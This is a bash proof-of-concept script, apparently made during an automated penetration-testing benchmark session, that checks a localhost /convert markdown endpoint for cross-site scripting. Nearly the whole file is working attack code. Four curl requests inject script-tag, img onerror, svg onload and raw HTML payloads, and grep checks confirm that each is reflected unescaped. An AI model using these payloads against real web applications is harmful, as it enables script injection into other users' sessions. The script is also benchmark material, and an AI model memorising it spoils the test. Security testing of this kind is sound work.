#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability in the /convert endpoint by injecting JavaScript through markdown_text parameter
# Target: ./repo
# Created: 2025-11-04T17:29:18.204Z
# Session: benchmark-XBEN-033-24-mhkubvue

# Stored XSS in Markdown Conversion - POC
# This script demonstrates the XSS vulnerability in the /convert endpoint

TARGET="http://localhost:80/convert"
OUTPUT_FILE="/tmp/xss_response.html"

echo "[*] Testing Stored XSS in /convert endpoint"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Script tag injection
echo "[+] Test 1: Script tag injection"
echo "[*] Payload: <script>alert(1)</script>"
curl -s -X POST "$TARGET" \
  -d 'markdown_text=<script>alert(1)</script>' \
  -o "$OUTPUT_FILE"

# Check if the script tag is present unescaped in response
if grep -q "<script>alert(1)</script>" "$OUTPUT_FILE"; then
    echo "[✓] VULNERABLE: Script tag found unescaped in response"
    echo "[*] Response snippet:"
    grep -o "<script>alert(1)</script>" "$OUTPUT_FILE" | head -1
else
    echo "[✗] Script tag not found or was escaped"
fi
echo ""

# Test 2: Image tag with onerror handler
echo "[+] Test 2: Image tag with onerror handler"
echo "[*] Payload: <img src=x onerror=alert('XSS')>"
curl -s -X POST "$TARGET" \
  -d "markdown_text=<img src=x onerror=alert('XSS')>" \
  -o "$OUTPUT_FILE"

# Check if the img tag with onerror is present unescaped in response
if grep -q "onerror=alert" "$OUTPUT_FILE"; then
    echo "[✓] VULNERABLE: Image tag with onerror handler found unescaped in response"
    echo "[*] Response snippet:"
    grep -o "<img[^>]*onerror[^>]*>" "$OUTPUT_FILE" | head -1
else
    echo "[✗] Image tag with onerror not found or was escaped"
fi
echo ""

# Test 3: SVG with onload handler
echo "[+] Test 3: SVG with onload handler"
echo "[*] Payload: <svg onload=alert('XSS')>"
curl -s -X POST "$TARGET" \
  -d "markdown_text=<svg onload=alert('XSS')>" \
  -o "$OUTPUT_FILE"

if grep -q "onload=alert" "$OUTPUT_FILE"; then
    echo "[✓] VULNERABLE: SVG with onload handler found unescaped in response"
    echo "[*] Response snippet:"
    grep -o "<svg[^>]*onload[^>]*>" "$OUTPUT_FILE" | head -1
else
    echo "[✗] SVG with onload not found or was escaped"
fi
echo ""

# Test 4: Full HTML content injection
echo "[+] Test 4: Full HTML content injection"
echo "[*] Payload: <h1>Injected Content</h1>"
curl -s -X POST "$TARGET" \
  -d "markdown_text=<h1>Injected Content</h1>" \
  -o "$OUTPUT_FILE"

if grep -q "<h1>Injected Content</h1>" "$OUTPUT_FILE"; then
    echo "[✓] VULNERABLE: HTML injection confirmed"
    echo "[*] Response contains injected content without escaping"
else
    echo "[✗] HTML content was escaped or not found"
fi
echo ""

echo "[*] POC complete. Check $OUTPUT_FILE for full response."